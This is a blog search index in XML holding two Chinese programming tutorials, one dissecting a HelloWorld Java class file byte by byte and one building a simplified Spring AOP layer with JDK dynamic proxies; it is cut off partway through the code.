<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java字节码二进制解析，看懂每一个字节</title>
    <link href="/2022/08/18/jvm/"/>
    <url>/2022/08/18/jvm/</url>
    
    <content type="html"><![CDATA[<h1 id="Java字节码二进制解析，看懂每一个字节"><a href="#Java字节码二进制解析，看懂每一个字节" class="headerlink" title="Java字节码二进制解析，看懂每一个字节"></a>Java字节码二进制解析，看懂每一个字节</h1><p>[TOC]</p><h2 id="基础环境："><a href="#基础环境：" class="headerlink" title="基础环境："></a>基础环境：</h2><ul><li><p>idea先安装jclasslib(这个不多说)和BinEd(这个用于查看字节码文件的二进制)</p></li><li><p>示范代码(一个简单的HelloWorld)：</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.demo;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        System.out.println(<span class="hljs-string">&quot;Hello World!!!&quot;</span>);    &#125;&#125;</code></pre></div></li><li><p>编译成字节码文件，同时我们也可以看到编译器给我们加了一个构造方法</p><p><img src="https://img-blog.csdnimg.cn/64791e0f6c604a08912ed65e1b4c7784.png" alt="请添加图片描述"></p></li><li><p>BinEd查看二进制文件</p><p><img src="https://img-blog.csdnimg.cn/54ab685aee5f4390aa2280ad486f723d.png" alt="请添加图片描述"></p></li></ul><h2 id="抽象认识字节码"><a href="#抽象认识字节码" class="headerlink" title="抽象认识字节码"></a>抽象认识字节码</h2><ul><li><p>先看一张图，前面的<strong>u</strong>代表字节，<strong>u4</strong>就是4字节，**!**就是字节数无法确定（请仔细看这张图）</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196309058-44addc71-19a2-4c5a-817e-e113a43053f6.png" alt="image.png"></p></li><li><p>让我们先根据这张图片抽象分析一下二进制文件</p><p><img src="https://img-blog.csdnimg.cn/b2aeee02be1d4f5e9e2652a0cfc4135d.png" alt="在这里插入图片描述"></p></li><li><p>我知道你的疑惑。为什么我知道<strong>常量池</strong>是哪里到哪里，<strong>方法的值</strong>是哪里到哪里，以及<strong>类属性值</strong>是哪里到哪里？</p></li><li><p>首先怕有些人没看出来，我这个类实现的接口个数和成员数量都是0，所以文件二进制中就没有间隔</p></li></ul><h2 id="细🔒常量池"><a href="#细🔒常量池" class="headerlink" title="细🔒常量池"></a>细🔒常量池</h2><ul><li><p>首先我们看常量池大小是0x22也就是33，我们使用jclasslib看一下确实是33个</p><p>![截屏2022-08-17 下午9.58.49](&#x2F;Users&#x2F;zhchen&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-08-17 下午9.58.49.png)</p></li><li><p>先补充一下常量池的11种类型数据的结构（很关键！！！）</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/2179815/1596801221629-d71bcaab-f2ea-4960-94f0-862dc41e9a25.jpeg?x-oss-process=image/resize,w_1496,limit_0" alt="img"></p></li><li><p>那么我们就可以根据占一个字节的tag知道它是什么类型的常量，也就确定了字节长度，对与utf8类型的常量，我们可以根据长度再得到其占的字节数，于是就有：</p><p><img src="https://img-blog.csdnimg.cn/7349c09de683404e846cde9d59198ba1.png" alt="在这里插入图片描述"></p></li></ul><h2 id="细🔒方法值"><a href="#细🔒方法值" class="headerlink" title="细🔒方法值"></a>细🔒方法值</h2><ul><li><p>方法值的组成：可以看到一个method_info中含有access_flags(访问控制权限)，name_index(名称在常量池的index)，descriptor_index(方法签名)，attribute_info(属性)</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777954370-968abdf9-27ad-472d-bd16-933d94bcf77c.png" alt="image.png"></p></li><li><p>在看attribute的组成，atrribute_name_index,attribute_length,info，其中我们知道了attribute_length便知道了attribute_info的长度</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777962604-6eeb49ab-c166-4303-9cce-52bdf4d50067.png" alt="image.png"></p></li><li><p>于是我们可以得到</p><p><img src="https://img-blog.csdnimg.cn/2077d6719e2e478188a2860f465febb1.png" alt="在这里插入图片描述"></p></li><li><p>现在我们只看第一个方法</p><p>它的name_index是07，所以我们在jclasslib里看一下编号为7的常量池，刚好就是init,也就是第一个方法的名字</p><p><img src="https://img-blog.csdnimg.cn/e14fe11a1c0d446e97996e932b409099.png" alt="请添加图片描述"></p></li><li><p>同样是第一个方法，我们再看它的attributes_count的值是1，说明只有一个attribute,并且它的attribute_name_index值是09，那么我们在常量池里找到9号字符串常量是Code</p><p><img src="https://img-blog.csdnimg.cn/afb820a51d1e474a816eb5b1b6d19563.png" alt="请添加图片描述"></p></li><li><p>jclasslib验证init方法的attribute时Code，同时也验证了attribute_length为0x2F也就是属性长度47</p><p><img src="https://img-blog.csdnimg.cn/6bae94d5a3fa42478dacdabb52659737.png" alt="请添加图片描述"></p></li></ul><h2 id="细🔒属性值"><a href="#细🔒属性值" class="headerlink" title="细🔒属性值"></a>细🔒属性值</h2><ul><li>上面那张图我们可以发现，Code下面又有二个东西，LineNumberTable和LocalVariableTable，我们先看这几张图就知道了</li><li><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777972245-8cc9b05e-55f6-4f1b-bdb1-11768b6277ab.png" alt="image.png"></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777979315-efee0c3c-5448-47e2-8ff6-141d8bd98ad5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777986999-851a1a94-1b62-426a-a88b-51e2a4702b43.png" alt="image.png"></p><ul><li><p>看来不同的属性存储的方式也不一样，而且Code属性中还包含LineNumberTable属性(代码所在行号,这就可以解释为什么报错能精准定位了)和LocalVariableTable属性(局部变量表)，于是</p><p><img src="https://img-blog.csdnimg.cn/5f5cc6f9ffe9420d890d15b9786a72a7.png" alt="在这里插入图片描述"></p></li></ul><h2 id="细说类属性值"><a href="#细说类属性值" class="headerlink" title="细说类属性值"></a>细说类属性值</h2><ul><li><p>和前面类似，我们可以根据attribute_name_index发现它是SourceFile，那么我已经给出了SourceFile_attribute的结构了，觉得读者应该可以自己尝试下标出最后那一行了😀</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777993406-7fd9aff9-428d-4884-8ede-12f1d4d08579.png" alt="image.png"></p></li></ul><h2 id="一些补充的东西"><a href="#一些补充的东西" class="headerlink" title="一些补充的东西"></a>一些补充的东西</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596777945935-ee37aab0-071e-4e29-9966-c8c4081a143d.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196744955-bb4f177d-d01f-4628-b568-439010b8b4fa.png?x-oss-process=image/resize,w_1500,limit_0" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2179815/1596196775123-210bfc49-9e11-4be1-9f91-7a048892015e.png?x-oss-process=image/resize,w_1500,limit_0" alt="image.png"></p><ul><li>主版本号与次版本号<br><img src="https://img-blog.csdnimg.cn/2bd6dd5a07ea4e9fbe3d9fb73f0f0c51.png" alt="主版本号与次版本号"></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写jvm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day5</title>
    <link href="/2022/08/17/spring_day05/"/>
    <url>/2022/08/17/spring_day05/</url>
    
    <content type="html"><![CDATA[<h1 id="Day05—AOP代码织入"><a href="#Day05—AOP代码织入" class="headerlink" title="Day05—AOP代码织入"></a>Day05—AOP代码织入</h1><p>[TOC]</p><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><ul><li><p>因为使用properties代替了xml，所以在application.properties中加入,简化操作</p><div class="code-wrapper"><pre><code class="hljs properties"><span class="hljs-comment">#多切面配置可以在key前面加前缀</span><span class="hljs-comment">#例如 aspect.logAspect.</span><span class="hljs-comment"></span><span class="hljs-comment">#切面表达式,expression#</span><span class="hljs-attr">pointCut</span>=<span class="hljs-string">public .* com.czh.spring.demo.service..*ServiceImpl..*(.*)</span><span class="hljs-comment">#切面类#</span><span class="hljs-attr">aspectClass</span>=<span class="hljs-string">com.czh.spring.demo.aspect.LogAspect</span><span class="hljs-comment">#切面前置通知#</span><span class="hljs-attr">aspectBefore</span>=<span class="hljs-string">before</span><span class="hljs-comment">#切面后置通知#</span><span class="hljs-attr">aspectAfter</span>=<span class="hljs-string">after</span><span class="hljs-comment">#切面异常通知#</span><span class="hljs-attr">aspectAfterThrow</span>=<span class="hljs-string">afterThrowing</span><span class="hljs-comment">#切面异常类型#</span><span class="hljs-attr">aspectAfterThrowingName</span>=<span class="hljs-string">java.lang.Exception</span></code></pre></div></li></ul><h2 id="完成AOP顶层设计"><a href="#完成AOP顶层设计" class="headerlink" title="完成AOP顶层设计"></a>完成AOP顶层设计</h2><ul><li><p>JoinPoint，定义一个切点的抽象，这是AOP的基础组成单元。可以理解为是业务方法的附加信息。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 回调连接点，通过它可以获得被代理的业务方法的所有信息</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyJoinPoint</span> &#123;    Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span>;<span class="hljs-comment">//业务方法本身</span>    Object[] getArguments();<span class="hljs-comment">//该方法的实参列表</span>    Object <span class="hljs-title function_">getThis</span><span class="hljs-params">()</span>;<span class="hljs-comment">//该方法所属的实例对象</span>    <span class="hljs-comment">//在JoinPoint中添加自定义属性</span>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserAttribute</span><span class="hljs-params">(String key,Object value)</span>;    <span class="hljs-comment">//从已添加的自定义属性中获取一个属性</span>    Object <span class="hljs-title function_">getUserAttribute</span><span class="hljs-params">(String key)</span>;&#125;</code></pre></div></li><li><p>MethodInterceptor，方法拦截器，AOP代码增强的基本组成单元，子类主要有MethodBeforeAdvice，AfterReturningAdvice，AfterThrowingAdvice.</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.intercept;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 方法拦截器顶层接口</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyMethodInterceptor</span> &#123;    Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span><span class="hljs-keyword">throws</span> Throwable;&#125;</code></pre></div></li><li><p>AopConfig，定义AOP的配置信息的封装对象，以方便在之后的代码中相互传递。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.config;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-comment">/**</span><span class="hljs-comment"> * AOP配置封装</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAopConfig</span> &#123;    <span class="hljs-comment">/*与properties文件中的属性一一对应*/</span>        <span class="hljs-comment">//切面表达式</span>    <span class="hljs-keyword">private</span> String pointCut;    <span class="hljs-comment">//前置通知方法名</span>    <span class="hljs-keyword">private</span> String aspectBefore;    <span class="hljs-comment">//后置通知方法名</span>    <span class="hljs-keyword">private</span> String aspectAfter;    <span class="hljs-comment">//要植入的切面类</span>    <span class="hljs-keyword">private</span> String aspectClass;    <span class="hljs-comment">//异常通知方法名</span>    <span class="hljs-keyword">private</span> String aspectAfterThrow;    <span class="hljs-comment">//需要通知的异常类型</span>    <span class="hljs-keyword">private</span> String aspectAfterThrowingName;&#125;</code></pre></div></li><li><p>AdvisedSupport，主要完成对AOP配置的解析。其中PointCutMatch()方法用来判断目标类是否符合切面规则，从而决定是否生成代理类，对目标方法进行增强。getInterceptorAndDynamicInterceptionAdvice()则主要根据AOP配置，将需要回调的方法封装成一个拦截器链并返回提供给外部获取。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.support;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.config.MyAopConfig;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.LinkedList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.regex.Matcher;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 主要用来解析和封装AOP配置</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdvisedSupport</span> &#123;    <span class="hljs-keyword">private</span> Class targetClass;    <span class="hljs-keyword">private</span> Object target;    <span class="hljs-keyword">private</span> Pattern pointCutClassPattern;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Map&lt;Method, List&lt;Object&gt;&gt; methodCache;    <span class="hljs-keyword">private</span> MyAopConfig aopConfig;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAdvisedSupport</span><span class="hljs-params">(MyAopConfig aopConfig)</span> &#123;        <span class="hljs-built_in">this</span>.aopConfig = aopConfig;    &#125;    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">getTargetClass</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> targetClass;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTargetClass</span><span class="hljs-params">(Class targetClass)</span> &#123;        <span class="hljs-built_in">this</span>.targetClass = targetClass;        parse();    &#125;    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getTarget</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> target;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;        <span class="hljs-built_in">this</span>.target = target;    &#125;      <span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getInterceptorAndDynamicInterceptionAdvice</span><span class="hljs-params">(Method method,Class&lt;?&gt; targetClass)</span><span class="hljs-keyword">throws</span> Exception&#123;        List&lt;Object&gt; cached = methodCache.get(method);                <span class="hljs-comment">//缓存未命中，则进行下一步处理</span>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == cached)&#123;            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> targetClass.getMethod(method.getName(), method.getParameterTypes());            cached = methodCache.get(m);            <span class="hljs-comment">//存入缓存</span>            <span class="hljs-built_in">this</span>.methodCache.put(m,cached);        &#125;        <span class="hljs-keyword">return</span> cached;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">pointCutMatch</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> pointCutClassPattern.matcher(<span class="hljs-built_in">this</span>.targetClass.toString()).matches();    &#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parse</span><span class="hljs-params">()</span>&#123;        <span class="hljs-comment">//pointCut表达式</span>        <span class="hljs-type">String</span> <span class="hljs-variable">pointCut</span> <span class="hljs-operator">=</span> aopConfig.getPointCut()                .replaceAll(<span class="hljs-string">&quot;\\.&quot;</span>,<span class="hljs-string">&quot;\\\\.&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\\\.\\*&quot;</span>,<span class="hljs-string">&quot;.*&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\(&quot;</span>,<span class="hljs-string">&quot;\\\\(&quot;</span>)                .replaceAll(<span class="hljs-string">&quot;\\)&quot;</span>,<span class="hljs-string">&quot;\\\\)&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">pointCutForClass</span> <span class="hljs-operator">=</span> pointCut.substring(<span class="hljs-number">0</span>, pointCut.lastIndexOf(<span class="hljs-string">&quot;\\(&quot;</span>) - <span class="hljs-number">4</span>);        pointCutClassPattern = Pattern.compile(<span class="hljs-string">&quot;class &quot;</span> + pointCutForClass.substring(pointCutForClass.lastIndexOf(<span class="hljs-string">&quot; &quot;</span>) + <span class="hljs-number">1</span>));                methodCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Method,List&lt;Object&gt;&gt;();        <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(pointCut);        <span class="hljs-keyword">try</span> &#123;            Class&lt;?&gt; aspectClass = Class.forName(aopConfig.getAspectClass());            HashMap&lt;String, Method&gt; aspectMethods = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();            <span class="hljs-keyword">for</span> (Method m : aspectClass.getMethods()) &#123;                aspectMethods.put(m.getName(),m);            &#125;                        <span class="hljs-comment">//在这里得到的都是原生方法</span>            <span class="hljs-keyword">for</span> (Method m : targetClass.getMethods()) &#123;                <span class="hljs-type">String</span> <span class="hljs-variable">methodString</span> <span class="hljs-operator">=</span> m.toString();                <span class="hljs-keyword">if</span>(methodString.contains(<span class="hljs-string">&quot;throw&quot;</span>))&#123;                    methodString = methodString.substring(<span class="hljs-number">0</span>,methodString.lastIndexOf(<span class="hljs-string">&quot;throws&quot;</span>)).trim();                &#125;                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(methodString);                <span class="hljs-keyword">if</span>(matcher.matches())&#123;                    <span class="hljs-comment">//能够满足切面规则的类,添加到AOP配置中</span>                    LinkedList&lt;Object&gt; advices = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();                    <span class="hljs-comment">//前置通知</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectBefore() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectBefore().trim())))&#123;                        advices.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyMethodBeforeAdvice</span>(aspectMethods.get(aopConfig.getAspectBefore()),aspectClass.newInstance()));                    &#125;                    <span class="hljs-comment">//后置通知</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectAfter() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectAfter().trim())))&#123;                        advices.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAfterReturningAdvice</span>(aspectMethods.get(aopConfig.getAspectAfter()),aspectClass.newInstance()));                    &#125;                    <span class="hljs-comment">//异常通知</span>                    <span class="hljs-keyword">if</span>(!(<span class="hljs-literal">null</span> == aopConfig.getAspectAfterThrow() || <span class="hljs-string">&quot;&quot;</span>.equals(aopConfig.getAspectAfterThrow().trim())))&#123;                        <span class="hljs-type">MyAfterThrowingAdvice</span> <span class="hljs-variable">afterThrowingAdvice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAfterThrowingAdvice</span>(aspectMethods.get(aopConfig.getAspectAfterThrow()), aspectClass.newInstance());                        afterThrowingAdvice.setThrowingName(aopConfig.getAspectAfterThrowingName());                        advices.add(afterThrowingAdvice);                    &#125;                    methodCache.put(m,advices);                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div></li><li><p>AopProxy，代理工厂的顶层接口，主要是CglibAopProxy和JdkDynamicAopProxy这二个子类分别实现CGlib和JDK Proxy的代理</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 代理工厂的顶层接口，提供获取代理对象的顶层入口</span><span class="hljs-comment"> * 默认就使用JDK的动态代理</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAopProxy</span> &#123;    <span class="hljs-comment">//获取一个代理对象</span>    Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span>;    <span class="hljs-comment">//通过自定义类加载器获得一个代理对象</span>    Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span>;&#125;</code></pre></div></li><li><p>CGlibAopProxy，暂不做实现</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.support.MyAdvisedSupport;<span class="hljs-comment">/**</span><span class="hljs-comment"> * TODO 使用CGlib生成代理类</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCglibAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAopProxy</span>&#123;    <span class="hljs-keyword">private</span> MyAdvisedSupport config;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyCglibAopProxy</span><span class="hljs-params">(MyAdvisedSupport advisedSupport)</span>&#123;        <span class="hljs-built_in">this</span>.config = advisedSupport;    &#125;        <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li><li><p>JdkDynamicAopProxy，主要功能在invoke()方法中。主要是调用AdvisedSupport的getInterceptorAndDynamicInterceptionAdvice()方法获得拦截器链。在目标类中，每一个被增强的目标方法都对应一个拦截器链。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.support.MyAdvisedSupport;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 使用JDK Proxy API来生成代理类</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyJdkDynamicAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAopProxy</span>, InvocationHandler &#123;    <span class="hljs-keyword">private</span> MyAdvisedSupport config;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyJdkDynamicAopProxy</span><span class="hljs-params">(MyAdvisedSupport config)</span> &#123;        <span class="hljs-built_in">this</span>.config = config;    &#125;    <span class="hljs-comment">//传入原生对象</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> getProxy(<span class="hljs-built_in">this</span>.config.getTargetClass().getClassLoader());    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(classLoader,<span class="hljs-built_in">this</span>.config.getTargetClass().getInterfaces(),<span class="hljs-built_in">this</span>);    &#125;    <span class="hljs-comment">//invoke()方法是执行代理的关键入口</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-comment">//将每一个JoinPoint也就是被代理的业务方法（Method）封装成一个拦截器，组合成一个拦截器链</span>        List&lt;Object&gt; interceptorAndDynamicMethodMatchers =                 config.getInterceptorAndDynamicInterceptionAdvice(method, <span class="hljs-built_in">this</span>.config.getTargetClass());        <span class="hljs-comment">//交给拦截器链MethodInvocation的proceed()方法执行</span>        <span class="hljs-type">MyMethodInvocation</span> <span class="hljs-variable">invocation</span> <span class="hljs-operator">=</span>                 <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyMethodInvocation</span>(proxy, <span class="hljs-built_in">this</span>.config.getTarget(), method, args, <span class="hljs-built_in">this</span>.config.getTargetClass(), interceptorAndDynamicMethodMatchers);        <span class="hljs-keyword">return</span> invocation.proceed();    &#125;&#125;</code></pre></div></li><li><p>MethodInvocation：关键方法是proceed()，先进行判断，如果拦截器为空，则说明目标方法无需增强，直接调用目标方法并返回。如果拦截器链不为空，则将拦截器链中的方法按顺序执行，直到拦截器链中所有方法全部执行完毕。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.intercept;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.aspect.MyJoinPoint;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 执行拦截器链，相当于Spring中ReflectiveMethodInvocation的功能</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodInvocation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyJoinPoint</span> &#123;        <span class="hljs-keyword">private</span> Object proxy;<span class="hljs-comment">//代理对象</span>    <span class="hljs-keyword">private</span> Method method;<span class="hljs-comment">//代理的目标方法</span>    <span class="hljs-keyword">private</span> Object target;<span class="hljs-comment">//代理的目标对象</span>    <span class="hljs-keyword">private</span> Class&lt;?&gt; targetClass;<span class="hljs-comment">//代理的目标类</span>    <span class="hljs-keyword">private</span> Object[] arguments;<span class="hljs-comment">//代理的方法的实参列表</span>    <span class="hljs-keyword">private</span> List&lt;Object&gt; interceptorsAndDynamicMethodMatchers;<span class="hljs-comment">//回调方法链</span>        <span class="hljs-comment">//保存自定义属性</span>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; userAttributes;        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">currentInterceptorIndex</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyMethodInvocation</span><span class="hljs-params">(Object proxy, Object target, Method method, Object[] arguments,Class&lt;?&gt; targetClass, List&lt;Object&gt; interceptorsAndDynamicMethodMatchers)</span> &#123;        <span class="hljs-built_in">this</span>.proxy = proxy;        <span class="hljs-built_in">this</span>.method = method;        <span class="hljs-built_in">this</span>.target = target;        <span class="hljs-built_in">this</span>.targetClass = targetClass;        <span class="hljs-built_in">this</span>.arguments = arguments;        <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers = interceptorsAndDynamicMethodMatchers;    &#125;    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">proceed</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-comment">//如果Interceptor执行完了，则执行joinPoint</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.currentInterceptorIndex == <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers.size()-<span class="hljs-number">1</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method.invoke(<span class="hljs-built_in">this</span>.target,<span class="hljs-built_in">this</span>.arguments);        &#125;        <span class="hljs-type">Object</span> <span class="hljs-variable">interceptorOrInterceptionAdvice</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers.get(++<span class="hljs-built_in">this</span>.currentInterceptorIndex);        <span class="hljs-comment">//如果要动态匹配joinPoint</span>        <span class="hljs-keyword">if</span>(interceptorOrInterceptionAdvice <span class="hljs-keyword">instanceof</span> MyMethodInterceptor)&#123;            <span class="hljs-type">MyMethodInterceptor</span> <span class="hljs-variable">mi</span> <span class="hljs-operator">=</span> (MyMethodInterceptor)interceptorOrInterceptionAdvice;            <span class="hljs-keyword">return</span> mi.invoke(<span class="hljs-built_in">this</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">//执行当前Interceptor</span>            <span class="hljs-keyword">return</span> proceed();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object[] getArguments() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.arguments;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getThis</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.target;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title 